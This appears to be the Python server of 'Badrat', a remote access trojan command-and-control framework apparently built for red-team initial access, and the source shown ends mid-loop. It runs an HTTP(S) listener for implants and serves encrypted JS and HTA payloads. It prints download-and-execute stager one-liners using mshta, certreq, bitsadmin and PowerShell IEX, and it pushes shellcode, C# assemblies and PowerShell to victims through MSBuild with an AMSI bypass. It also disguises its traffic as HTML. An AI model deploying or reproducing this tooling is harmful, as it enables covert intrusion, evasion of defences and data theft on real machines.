#!/usr/bin/env python3

# import from resources/ekript.py
from resources import ekript

from flask import Flask, request, redirect
from datetime import datetime
from itertools import cycle
from pathlib import Path

import threading
import argparse
import readline
import logging
import random
import base64
import time
import json
import sys
import os
import re

# CSCI 201 teacher: Noooo you can't just use global variables to make things easier
# haha, global variables go brrr

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", help="Port to start the HTTP(S) server on", default=8080, action="store", dest="port")
parser.add_argument("-s", "--ssl", help="Start listener using HTTPS instead of HTTP (default)", default=False, action="store_true", dest="ssl")
parser.add_argument("-v", "--verbose", help="Start Badrat in debug/verbose mode for troubleshooting", default=False, action="store_true", dest="verbose")
parser.add_argument("-r", "--redirect", help="Website to redirect non-rat clients to", default="en.wikipedia.org/wiki/Rat", action="store", dest="redirect_url")
parser.add_argument("-n", "--no-payload-encryption", help="Disable stager payload encryption. Serve raw payloads instead", default=False, action="store_true", dest="no_payload_encryption")
parser.add_argument("-d", "--disable-staging", help="Disable payload staging. Flask server won't host payloads", default=False, action="store_true", dest="disable_staging")
args = parser.parse_args()
port = args.port
ssl = args.ssl
verbose = args.verbose
no_payload_encryption = args.no_payload_encryption
disable_staging = args.disable_staging
redirect_url = args.redirect_url
if(not str.startswith("http://", redirect_url) or not str.startswith("https://", redirect_url)):
    redirect_url = "http://" + redirect_url

supported_types = ["c", "c#", "js", "ps1", "hta"]
default_msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
msbuild_path = default_msbuild_path
alpha = "abcdefghijklmnopqrstuvwxyz"

# Generate a random path to serve payloads off of
rand_path = ''.join(random.choice(alpha) for choice in range(10)) 

# Only applies to hta and js rats
prepend_amsi_bypass_to_psh = True

# I should probably make a dict of dicts...
commands = {}
rats = {}
types = {}
usernames = {}
hostnames = {}
ip_addrs = {}
notes = {}


# Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
class Completer(object):
    def __init__(self):
        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "runextra"]
        self.re_space = re.compile('.*\s+$', re.M)

    def add_tab_item(self, item):
        self.tab_cmds.append(item)

    def remove_tab_item(self, item):
        self.tab_cmds.remove(item)

    def _listdir(self, root):
        "List directory 'root' appending the path separator to subdirs."
        res = []
        for name in os.listdir(root):
            path = os.path.join(root, name)
            if os.path.isdir(path):
                name += os.sep
            res.append(name)
        return res

    def _complete_path(self, path=None):
        "Perform completion of filesystem path."
        if not path:
            return self._listdir('.')
        dirname, rest = os.path.split(path)
        tmp = dirname if dirname else '.'
        res = [os.path.join(dirname, p)
                for p in self._listdir(tmp) if p.startswith(rest)]
        # more than one match, or single match which does not exist (typo)
        if len(res) > 1 or not os.path.exists(path):
            return res
        # resolved to a single directory, so return list of files below it
        if os.path.isdir(path):
            return [os.path.join(path, p) for p in self._listdir(path)]
        # exact file match terminates this completion
        return [path + ' ']

    def _complete_rat(self, ratID=None):
        if not ratID:
            return list(rats.keys()) + ["all"]
        res = [rat for rat in (list(rats.keys()) + ["all"]) if rat.startswith(ratID)]
        # Partial match
        if(len(res) > 1):
            return res
        # Exact match
        if(len(res) == 1):
            res[0] += ' '
            return res

    # Register all these completable commands as having special arguments
    # Completable path argments except 'remove' and 'note' which autocompletes to the ratID
    def complete_upload(self, args):
        return self._complete_path(args[0])

    def complete_psh(self, args):
        return self._complete_path(args[0])

    def complete_csharp(self, args):
        return self._complete_path(args[0])

    def complete_shellcode(self, args):
        return self._complete_path(args[0])

    def complete_eval(self, args):
        return self._complete_path(args[0])

    def complete_runextra(self, args):
        return self._complete_path(args[0])

    def complete_remove(self, args):
        return self._complete_rat(args[0])

    def complete_note(self, args):
        return self._complete_rat(args[0])

    def complete(self, text, state):
        "Generic readline completion entry point."
        buffer = readline.get_line_buffer()
        line = readline.get_line_buffer().split()
        # show all commands
        if not line:
            return [c + ' ' for c in self.tab_cmds][state]
        # account for last argument ending in a space
        if self.re_space.match(buffer):
            line.append('')
        # resolve command to the implementation function
        cmd = line[0].strip()
        if cmd in self.tab_cmds:
            impl = getattr(self, 'complete_%s' % cmd)
            args = line[1:]
            if args:
                return (impl(args) + [None])[state]
            return [cmd + ' '][state]
        results = [c + ' ' for c in self.tab_cmds if c.startswith(cmd)] + [None]
        return results[state]

comp = Completer()
# we want to treat '/' as part of a word, so override the delimiters
readline.set_completer_delims(' \t\n;')
readline.parse_and_bind("tab: complete")
readline.set_completer(comp.complete)

def pretty_print_banner():
    banner = """
    $$\                       $$\                       $$\                             _
    $$ |                      $$ |                      $$ |                          (( )_,    ,
    $$$$$$$\   $$$$$$\   $$$$$$$ | $$$$$$\   $$$$$$\  $$$$$$\    $$$$$$$\    .--.     \ '/     /.\\
    $$  __$$\  \____$$\ $$  __$$ |$$  __$$\  \____$$\ \_$$  _|  $$  _____|       )    / \=    /O o\     _
    $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
    $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
    $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.15 No more CMD.exe        "`
    """
    pretty_print(banner)

def set_msbuild_path(inp):
    global msbuild_path, default_msbuild_path
    path = ' '.join(inp.split(" ")[1:])
    if(path == "" or path == " "):
        pretty_print("Usage: set-msbuild-path <remote_path_to_msbuild>")
        pretty_print("Use \"set-msbuild-path default\" to restore to default")
        return
    if(path == "default"):
        pretty_print("Resetting msbuild path to default: " + colors(default_msbuild_path))
        msbuild_path = default_msbuild_path
    else:
        pretty_print("Setting msbuild path to " + colors(path))
        msbuild_path = path

# Wrap C2 comms in html and html2 code to make requests look more legitimate
def htmlify(data):
    html = "<html><head><title>http server</title></head>\n"
    html += "<body>\n"
    html += "<b>\n"
    html2 = "</b>\n"
    html2 += "</body>\n"
    html2 += "</html>\n"
    return(html + data + "\n" + html2)

# Print colors according to the rat type
def colors(value):
    # ANSI color codes need to be wrapped with readline "invisible characters" (start: \001 end: \002)
    # so they don't count as characters for readline history: https://stackoverflow.com/a/55773513
    BOLD = '\001\033[1m\002'
    ENDC = '\001\033[0m\002'
    UNDERLINE = '\001\033[4m\002'
    c = '\001\033[91m\002'    # Red
    cs = '\001\033[92m\002'   # Green
    js = '\001\033[93m\002'   # Yellow
    ps1 = '\001\033[94m\002'  # Blue
    hta = '\001\033[95m\002'  # Purple
    colors = {"c":c, "c#":cs, "js":js, "ps1":ps1, "hta":hta}
    if(value in colors.keys()):
        return(colors[value] + value + ENDC)
    elif(value in types.keys()):
        return(colors[types[value]] + value + ENDC)
    elif(value == "all"):
        return(BOLD + "ALL RATS" + ENDC)
    elif(value == ">>"):
        return( BOLD + c + ">" + js + ">" + ENDC)
    elif(value == "quit"):
        return(c + "commit Seppuku" + ENDC)
    elif(value == "HTTP"):
        return(BOLD + js + value + ENDC)
    elif(value == "HTTPS"):
        return(BOLD + cs + value + ENDC)
    try:
        checkin = datetime.strptime(value, "%H:%M:%S")
        delta_seconds = (datetime.now() - checkin).seconds
        if(delta_seconds > 21):
            return(BOLD + c + value + ENDC)
        elif(delta_seconds > 7):
            return(BOLD + js + value + ENDC)
        else:
            return(BOLD + cs + value + ENDC)
    except:
        # Truncate reeeeally long commands over 120 characters
        if(len(value) > 120 and not verbose):
            return(UNDERLINE + value[0:116] + ENDC + "...")
        else:
            return(UNDERLINE + value + ENDC)

def log_console(text):
    # Open a file for console logging
    with open("logs/console.log", 'a') as fd:
        fd.write(text + os.linesep)

# Get the current main thread to identify notifications vs interactive text
main_thread_id = threading.current_thread().ident
prompt = colors("Badrat") + " //> "
def pretty_print(text, redraw = False):
    sys.stdout.write("\033[1K\r" + text + os.linesep)
    log_console(text)
    sys.stdout.flush()
    if redraw or threading.current_thread().ident != main_thread_id:
        sys.stdout.write(prompt + readline.get_line_buffer())
        log_console(prompt + readline.get_line_buffer())
        sys.stdout.flush()

# Page sent to "unauthorized" users of the http listener
def default_page():
    return(redirect(redirect_url))

# Allow rats to call home and request more ratcode of their own type
# Or send ad-hoc (stager) ratcode from the server.
def send_ratcode(ratID=None, ratType=None, ip_addr=None):
    if(ratType and ip_addr): # Ad hoc ratcode send
        pretty_print("[*] Sending ad-hoc " + colors(ratType) + " ratcode to " + ip_addr)
        try:
            fd = open(os.getcwd() + "/rats/badrat." + ratType, 'rb')
            ratcode = fd.read()

            # Added ratcode xor encryption for js and hta payloads only -- see resources/ekript.py
            if(not no_payload_encryption and ratType == "js"):
                key = ekript.gen_key()
                ratcode = ekript.make_js_loader_template(ekript.ekript_js(ratcode, key), key)

            if(not no_payload_encryption and ratType == "hta"):
                key = ekript.gen_key()
                # In the case of a JS file the JS source is just the entire file...
                # For HTA's the JS source is everything between the <script> </script> tags
                js_source = ratcode.split(b"<script>")[1].split(b"</script>")[0]
                ratcode = ekript.make_hta_loader_template(ekript.ekript_js(js_source, key), key, ratcode)

        except e:
            pretty_print("[-] Error sending ad-hoc ratcode: No such rat exists: /rats/badrat." + ratType)
            pretty_print(e)
            return(default_page())

    elif(ratID): # Spawn new rat from current rat
        pretty_print("[*] Sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
        fd = open(os.getcwd() + "/rats/badrat." + types[ratID], 'r')
        ratcode = fd.read()
        ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')

    fd.close()
    return(ratcode)

def encode_file(filepath):
    with open(Path(filepath).resolve() , "rb") as fd:
        data = fd.read()
    b64data = base64.b64encode(data).decode('utf-8')
    return(b64data)

def create_psscript(filepath, extra_cmds=""):
    with open(Path(filepath).resolve() , "r") as fd:
        data = fd.read()
        if(extra_cmds):
            data += "\n" + extra_cmds

        b64data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
        return(b64data)

def send_invoke_shellcode(input_data, ratID):
    shellcode_path = input_data.split(" ")[1]
    rand_classname = "C" +''.join(random.choice(alpha) for choice in range(7))

    with open(os.getcwd() + "/resources/Invoke-Shellcode.ps1" , "r") as fd:
        invoke_shellcode_data = fd.read()

    with open(Path(shellcode_path).resolve() , "rb") as fd:
        shellcode_data = fd.read()

    invoke_shellcode_data = invoke_shellcode_data.replace("~~CLASSNAME~~", rand_classname)
    invoke_shellcode_data = invoke_shellcode_data.replace("~~KEY~~", ratID)
    invoke_shellcode_data = invoke_shellcode_data.replace("~~SHELLCODE~~", xor_crypt_and_encode(shellcode_data, ratID))
    b64data = base64.b64encode(invoke_shellcode_data.encode('utf-8')).decode('utf-8')
    return(b64data)

def send_invoke_assembly(input_data):
    assembly_path = input_data.split(" ")[1]

    with open(os.getcwd() + "/resources/Invoke-Assembly.ps1" , "r") as fd:
        invoke_assembly_data = fd.read()

    with open(Path(assembly_path).resolve() , "rb") as fd:
        assembly_data = fd.read()

    invoke_assembly_data = invoke_assembly_data.replace("~~ARGUMENTS~~", parse_c_sharp_args(input_data))
    invoke_assembly_data = invoke_assembly_data.replace("~~ASSEMBLY~~", base64.b64encode(assembly_data).decode('utf-8'))
    b64data = base64.b64encode(invoke_assembly_data.encode('utf-8')).decode('utf-8')
    return(b64data)

def send_shellcode_msbuild_xml(input_data, ratID):
    shellcode_path = input_data.split(" ")[1]
    with open(os.getcwd() + "/resources/shellcode_modified.xml", "r") as fd:
        msbuild_data = fd.read()

    with open(Path(shellcode_path).resolve() , "rb") as fd:
        shellcode_data = fd.read()

    msbuild_data = msbuild_data.replace("~~KEY~~",  ratID)
    msbuild_data = msbuild_data.replace("~~SHELLCODE~~", xor_crypt_and_encode(shellcode_data, ratID))

    b64data = base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
    return(b64data)

def send_nps_msbuild_xml(input_data, ratID):
    ps_script_path = input_data.split(" ")[1]
    amsi_data = ""
    extra_cmds = ""
    try:
        extra_cmds = " ".join(input_data.split(" ")[2:])
    except:
        pass

    with open(os.getcwd() + "/resources/nps_modified.xml" , "r") as fd:
        msbuild_data = fd.read()

    if(prepend_amsi_bypass_to_psh):
        with open(os.getcwd() + "/resources/Disable-Amsi.ps1" , "rb") as fd:
            amsi_data = fd.read()

    with open(Path(ps_script_path).resolve() , "rb") as fd:
        script_data = fd.read()
        if(extra_cmds):
            script_data += b"\n" + bytes(extra_cmds, 'utf-8')

    msbuild_data = msbuild_data.replace("~~KEY~~",  ratID)
    msbuild_data = msbuild_data.replace("~~AMSI~~", xor_crypt_and_encode(amsi_data, ratID))
    msbuild_data = msbuild_data.replace("~~SCRIPT~~", xor_crypt_and_encode(script_data, ratID))
    b64data =  base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
    return(b64data)

def send_csharper_msbuild_xml(input_data, ratID):
    assembly_path = input_data.split(" ")[1]

    with open(os.getcwd() + "/resources/csharper_modified.xml" , "r") as fd:
        csharper_data = fd.read()

    with open(Path(assembly_path).resolve() , "rb") as fd:
        assembly_data = fd.read()

    csharper_data = csharper_data.replace("~~KEY~~", ratID)
    csharper_data = csharper_data.replace("~~ARGS~~", parse_c_sharp_args(input_data))
    csharper_data = csharper_data.replace("~~ASSEMBLY~~", xor_crypt_and_encode(assembly_data, ratID))
    b64data = base64.b64encode(csharper_data.encode('utf-8')).decode('utf-8')
    return(b64data)

# Parses an operator's "cs" line to the correct format needed in msbuild xml file
# Example: cs SharpDump.exe arg1 arg2 "third arg" -> "arg1","arg2","third arg"
def parse_c_sharp_args(argument_string):
    stringlist = []
    stringbuilder = ""
    inside_quotes = False

    args = argument_string.split(" ")[2:]
    args = " ".join(args)

    if(not args):
        return('  ')
    for ch in args:
        if(ch == " " and not inside_quotes):
            stringlist.append(stringbuilder) # Add finished string to the list
            stringbuilder = "" # Reset the string
        elif(ch == '"'):
            inside_quotes = not inside_quotes
        else: # Ch is a normal character
            stringbuilder += ch # Add next ch to string

    # Finally...
    stringlist.append(stringbuilder)
    for arg in stringlist:
        if(arg == ""):
            stringlist.remove(arg)

    argument_string = '","'.join(stringlist)
    # Replace backslashes with a literal backslash so an operator can type a file path like C:\windows\system32 instead of C:\\windows\\system32
    argument_string = argument_string.replace("\\", "\\\\")
    return('"' + argument_string + '"')

# Simple xor cipher to encrypt C# binaries and encode them into a base64 string
def xor_crypt_and_encode(data, key):
     xored = []
     for (x,y) in zip(data, cycle(key)):
         xored.append(x ^ ord(y))
     return(base64.b64encode(bytes(xored)).decode('utf-8'))

def serve_server(port=8080):
    app = Flask(__name__)

    # Disable annoying console output for GET/POST requests
    if(not verbose):
        os.environ['WERKZEUG_RUN_MAIN'] = 'true'
        log = logging.getLogger('werkzeug')
        log.disabled = True

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['GET'])
    def badrat_get(path):
        # Check to see if we are serving ad-hoc ratcode -- GET version
        ip_addr = request.environ['REMOTE_ADDR']
        if(str.startswith(path, rand_path + "/b.") and not disable_staging):
            ratType = path.split(".")[1]
            return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
        elif(verbose):
            pretty_print("[v] GET request from non-rat client requested path /" + path)
        return(default_page())

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['POST'])
    def badrat_comms(path):
        ip_addr = request.environ['REMOTE_ADDR']
        # Check to see if we are serving ad-hoc ratcode -- POST version
        if(str.startswith(path, rand_path + "/b.") and not disable_staging):
            ratType = path.split(".")[1]
            return(send_ratcode(ratType=ratType, ip_addr=ip_addr))

        #
        # Rats and the server communicate with each other using JSON strings
        # To support peer-to-peer rats, each rat and the server send 1 or more "packages" to and from each other.
        # Packages are formatted like so: { "p":[ {package1}, {package2} ] }
        #
        # Data sent from a rat (Rat --> Server) may look like the following. This data contains 2 packages
        # { "p":[ {"type": "hta", "id": 3082961485, "un": "kclark", "hn": "WS01"}, {"type": "js", "id": 123345667, "un": "Administrator", "hn": "DC"} ] }
        #
        # Data sent back TO a rat (Server --> Rat) looks similar, but the packages will contain different values. Example below. This data also contains 2 packages.
        # { "p":[ {"id":"123445677","cmnd": "whoami"}, {"id":"3082961485","cmnd": "hostname"} ] }
        #

        # We are dealing with normal rat comms
        # Parse POST parameters into JSON string then into python dict
        post_json = request.get_json(force=True)
        if(verbose):
            pretty_print("[v] rat  sent data: " + str(post_json))
        
        try:
            post_dict = dict(post_json)
            packages = post_dict['p']
        except:
            pretty_print("\n[!] Failed to parse post_dict or pull list of packages out of POST request")
            return(default_page())
            
        return_dict = {"p": []} # We will use this to build the return JSON
        # For loop starts here ... parse each package one at a time
        for package in packages:
            try:
                ratID = str(package['id'])
                ratType = str(package['type'])
                username = str(package['un'])
                hostname = str(package['hn'])
                if(ratType not in supported_types):
                    ratType = "?"
            except:
                pretty_print("\n[!] Failed to grab id, type, username, or hostname param from package")
                return(default_page())
    
            # Update checkin time for an agent every checkin
            checkin = datetime.now().strftime("%H:%M:%S")
            rats[ratID] = checkin
            types[ratID] = ratType
            usernames[ratID] = username
            hostnames[ratID] = hostname
            ip_addrs[ratID] = ip_addr
    
            # If there is no current command for a rat, create a blank one
            if(ratID not in commands):
                commands[ratID] = ""
                comp.add_tab_item(ratID)
                pretty_print("[*] (" + datetime.now().strftime("%H:%M:%S, %b %d") + ") New rat checked in: " + colors(ratID))
    
            if("retval" in package.keys()):
                commands[ratID] = ""
                pretty_print("[*] Results from rat " + colors(str(package['id'])) + ":\n")
                pretty_print('\033[1;97m' + base64.b64decode(package['retval']).decode('utf-8') + '\033[0m')
    
            if("dl" in package.keys()):
                commands[ratID] = "" # Reset command back to "" (blank) after we finish processing the results
                rand = ''.join(random.choice(alpha) for choice in range(10)) 
                with open(Path("downloads/" + ratID + "." + rand).resolve() , "wb") as fd:
                    fd.write(base64.b64decode(package['dl']))
                pretty_print("\n[*] File download from rat " + colors(ratID) + " saved to " + colors("downloads/" + colors(ratID)) + colors("." + rand))
    
            # Reset the command on deck to blank after sending the command (so we don't get repeated executions of the same command)
            cmnd = commands[ratID]
            commands[ratID] = ""
            return_dict['p'].append({"id": ratID, "cmnd": cmnd})

        if(verbose):
            pretty_print("[v] Server sends data to rat " + colors(ratID) + ": " + json.dumps(return_dict))
        return(htmlify(json.dumps(return_dict)))

    if(verbose):
        pretty_print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")

    if(not disable_staging):
        pretty_print("[*] Ad-Hoc ratcode servable from path: " + colors("/" + rand_path + "/b.<rat_type>") + " via GET or POST")
    else:
        pretty_print("[!] Whoah! You chose to disable hosted payload stages. Payload staging won't work.")

    # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
    if(ssl):
        pretty_print("[*] Starting " + colors("HTTPS") + " listener on port " + str(port))
        pretty_print("[*] Certificate file: " + colors("cert/cert.pem") +" Private key file: " + colors("cert/privkey.pem") + "\n\n")
        app.run(host="0.0.0.0", port=port, ssl_context=("cert/cert.pem", "cert/privkey.pem"))
    else:
        pretty_print("[*] Starting " + colors("HTTP") + " listener on port " + str(port))
        app.run(host="0.0.0.0", port=port)

def get_stagers(lhost):
    if(disable_staging):
        pretty_print("You disabled payload staging! Restart Badrat server without '--disable-staging' to use the 'stagers' command")
        return
    protocol = "http"
    if(ssl):
        protocol = "https"
    url = protocol + "://" + lhost + ":" + str(port) + "/" + rand_path + "/b." # Needs rat type at the end
    pretty_print("")
    pretty_print("[*] Webserver serving ratcode on: " + colors("/" + rand_path + "/b.<rat_type>") + " on port " + str(port) + " (HTTP POST and GET only)")
    pretty_print("================================================================================================")
    pretty_print("")
    pretty_print("    " + colors("hta") + ":")
    pretty_print("  mshta " + url + "hta")
    pretty_print("")
    pretty_print("    " + colors("js") + ":")
    pretty_print("  certreq -Post -config " + url + "js c:\windows\win.ini a.txt & wscript /e:jscript a.txt")
    pretty_print("  curl.exe " + url + "js -o a.txt & wscript /e:jscript a.txt")
    pretty_print("  bitsadmin /transfer yeet /download /priority high " + url + "js %temp%\\a.js & timeout /t 1 & wscript %temp%\\a.js")
    pretty_print("  echo var a = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");a.Open(\"GET\", \"" + url + "js\");a.Send();eval(a.ResponseText) > a.js & wscript a.js")
    pretty_print("")
    pretty_print("    " + colors("ps1") + ":")
    pretty_print("  (new-object net.webclient).downloadstring('" + url + "ps1')|IEX")
    pretty_print("  (iwr -UseBasicParsing " + url + "ps1).Content|IEX")
    pretty_print('  $ExecutionContext.InvokeCommand.InvokeScript([net.webclient]::new().DownloadString("' + url + 'ps1"))')
    pretty_print('  [Scriptblock]::Create([net.webclient]::new().DownloadString("' + url + 'ps1")).invoke()')
    pretty_print('  [Management.Automation.PowerShell]::Create().addscript((irm ' + url + 'ps1)).invoke()')
    pretty_print("")

def get_rats(current=""):
    pretty_print("\n    {:<10}\t{:<4}\t{:<8}\t{:<20}\t{:<15}\t{:<10}".format("implant id", "type", "check-in","username","ip address","hostname"))
    pretty_print("    ----------\t----\t--------\t--------            \t----------     \t--------")
    for ratID, checkin in rats.items():
        if(current == ratID or current == "all"):
            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}\t{:<20}\t{:<15}\t{:<10}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
        else:
            pretty_print("    {:<10}\t{:<4}\t{:<8}\t{:<20}\t{:<15}\t{:<10}".format(ratID, colors(types[ratID]), colors(checkin), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
        if(ratID in notes.keys() and notes[ratID] != ""):
            pretty_print("      L..:>> " + notes[ratID])
    pretty_print("")

def remove_rat(ratID):
    if(ratID == "all"):
        pretty_print("[*] Removing ALL rats")
        for ratID in rats.keys():
            comp.remove_tab_item(ratID)
        rats.clear()
        types.clear()
    else:
        try:
            comp.remove_tab_item(ratID)
            del rats[ratID]
            del types[ratID]
            pretty_print("[*] Removing rat " + ratID)
        except:
            pretty_print("[!] Can't delete rat " + ratID + " for some reason")

def get_help():
    pretty_print("\nBadrats is a collection of rats designed for initial access. Rats are designed to be small and have few features.")
    pretty_print("For better post exploit functionality, execution should be passed off to other C2 frameworks")
    pretty_print("-------------------------------------------------------------------------")
    pretty_print("")
    pretty_print("Server commands: -- commands to control the badrat server")
    pretty_print("help -- it's this help page, duh")
    pretty_print("rats/agents/sessions -- gets the list of rats and their last checkin time")
    pretty_print("exit -- exits the badrat console and shuts down the listener")
    pretty_print("<ratID> -- start interacting with the specified rat")
    pretty_print("all -- start interacting with ALL rats")
    pretty_print("back -- backgrounds the current rat and goes to the main menu")
    pretty_print("remove all -- unregisters ALL rats")
    pretty_print("remove <ratID> -- unregisters the specified <ratID>")
    pretty_print("clear -- clear all rat command queues (useful for stopping accidental commands)")
    pretty_print("note -- add a note to a rat")
    pretty_print("")
    pretty_print("Rat commands: -- commands to interact with a badrat rat")
    pretty_print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on rat type")
    pretty_print("quit -- when interacting with a rat, type quit to task the rat to shut down")
    pretty_print("spawn -- used to spawn a new rat in a new process.")
    pretty_print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
    pretty_print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
    pretty_print("csharp <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
    pretty_print("example: csharp scripts/Snaffler.exe --domain borgar.local --stdout")
    pretty_print("shellcode <local_shellcode.bin_path> -- Runs the specified shellcode in a new process using MSBuild.exe and a C Sharp injection stub")
    pretty_print("upload -- Uploads file from C2 server to rat host")
    pretty_print("example: upload scripts/Invoke-Bloodhound.ps1 C:\\users\\localadmin\\desktop\\ibh.ps1")
    pretty_print("download -- downloads the specified file from the rat host")
    pretty_print("example: download C:\\users\\localadmin\\desktop\\minidump_660.dmp")
    pretty_print("eval <local_jscript_file> -- sends the jscript file to the rat (JS and HTA only) to be evaulated in line. Useful for Gadget2JS payloads")
    pretty_print("example: eval test.js")
    pretty_print("-------------------------------------------------------------------------")
    pretty_print("")
    pretty_print("Extra things to know:")
    pretty_print("The rats are written in Windows JScript, Powershell and C#, run in a cscript.exe/wscript.exe, mshta.exe, powershell.exe, or standard exe process")
    pretty_print("The server is written in python and uses an HTTP(S) listener for C2 comms")
    pretty_print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
    pretty_print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
    pretty_print("By default, rat communications are NOT SECURE. Do not send sensitive info through the C2 channel unless using SSL")
    pretty_print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe")
    pretty_print("Tal Liberman's AMSI Bypass is included by default for msbuild psh execution (js and hta ONLY). This may not be desireable and can be turned off by changing the variable at the beginning of this script")
    pretty_print("All assemblies run with \"csharp\" must be compiled with a public Main method and a public class that contains Main\n")

if __name__ == "__main__":
    # Start the Flask server
    server = threading.Thread(target=serve_server, kwargs=dict(port=port), daemon=True)
    server.start()
    time.sleep(0.5)
    if not server.is_alive():
        pretty_print("\n[!] Could not start listener!")
        sys.exit()
    else:
        pretty_print_banner()

    # Badrat main menu loop
    while True:
        try:
            prompt = colors("Badrat") + " //> "
            inp = input(prompt)
            log_console(prompt + inp)

            # Check if input has a trailing space, like 'exit ' instead of 'exit' -- for tab completion
            inp = inp.rstrip()

            # Check if the operator wants to quit badrat
            if(inp == "exit"):
                pretty_print("[*] Shutting down badrat listener")
                sys.exit()

            # Gets the help info
            elif(inp == "help"):
                get_help()

            # Set the msbuild path
            elif(str.startswith(inp, "set-msbuild-path")):
                set_msbuild_path(inp)

            elif(str.startswith(inp, "stagers")):
                try:
                    lhost = inp.split(" ")[1]
                    get_stagers(lhost)
                except:
                    pretty_print("Usage: stagers <LHOST IP or domain name>")

            # View rats, their types, and their latest checkin times
            elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
                get_rats()

            # Remove rats -- either by ratID or all
            elif(str.startswith(inp, "remove")):
                try:
                    remove_rat(inp.split(" ")[1])
                except:
                    pretty_print("invalid syntax: Use 'remove <ratID>' or 'remove all'")

            elif(str.startswith(inp, "note ")):
                note_ratID = inp.split(" ")[1]
                if(note_ratID in rats.keys()):
                    notes[note_ratID] = ' '.join(inp.split(" ")[2:])
                else:
                    pretty_print("Usage: note <ratID> <important note text>")
                continue

            elif(inp == "clear"):
                commands = commands.fromkeys(commands, "")
                pretty_print("Cleared all rat command queues!")

            # Enter rat specific command prompt
            elif(inp in rats.keys() or inp == "all"):
                ratID = inp

                # Interact-with-rat loop
                while True:
                    prompt = colors(ratID) + " \\\\> "
                    inp = input(prompt)
                    log_console(prompt + inp)

                    if(inp != ""):
                        inp = inp.rstrip()

                        if(inp == "back" or inp == "exit"):
                            break

                        elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
                            get_rats(ratID)
                            continue

                        elif(inp == "clear"):
                            commands = commands.fromkeys(commands, "")
                            pretty_print("Cleared all rat command queues!")
                            continue

                        elif(inp == "help"):
                            get_help()
                            continue

                        # Set the msbuild path
                        elif(str.startswith(inp, "set-msbuild-path")):
                            set_msbuild_path(inp)
                            continue

                        elif(str.startswith(inp, "stagers")):
                            try:
                                lhost = inp.split(" ")[1]
                                get_stagers(lhost)
                            except:
                                pretty_print("Usage: stagers <LHOST IP or domain name>")
                            continue

                        elif(str.startswith(inp, "note ")):
                            try:
                                maybe_ratID = inp.split(" ")[1]
                                if(maybe_ratID in rats.keys()):
                                    notes[maybe_ratID] = ' '.join(inp.split(" ")[2:])
                                else:
                                    notes[ratID] = ' '.join(inp.split(" ")[1:])
                            except:
                                pretty_print("Usage: note [ratID] <important note text>")
                            continue

                        elif(inp == "quit"):
                            inp = "quit"

                        elif(inp == "spawn"):
                            if(types[ratID] == "ps1" or types[ratID] == "hta"):
                                inp = "spawn " + send_ratcode(ratID)

                        elif(str.startswith(inp, "psh ")):
                            try:
                                filepath = inp.split(" ")[1]
                                extra_cmds = ""
                                try:
                                    extra_cmds = " ".join(inp.split(" ")[2:])
                                except:
                                    pass
                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
                                    inp = "psh " + create_psscript(filepath, extra_cmds)
                                else:
                                    inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
                            except:
                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                continue

                        elif(str.startswith(inp, "shellcode ")):
                            try:
                                filepath = inp.split(" ")[1]
                                if(types[ratID] == "ps1"):
                                    inp = "shc " +  send_invoke_shellcode(inp, ratID)
                                elif(types[ratID] == "c#"):
                                    inp = "shc " + encode_file(filepath)
                                else:
                                    inp = "shc " + msbuild_path + " " + send_shellcode_msbuild_xml(inp, ratID)
                            except:
                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                continue

                        elif(str.startswith(inp, "eval ")):
                            try:
                                filepath = inp.split(" ")[1]
                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
                                    pretty_print("[!] Eval is not supported for PS1 or C# rats")
                                    continue
                                else:
                                    inp = "ev " + encode_file(filepath)
                            except:
                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                continue

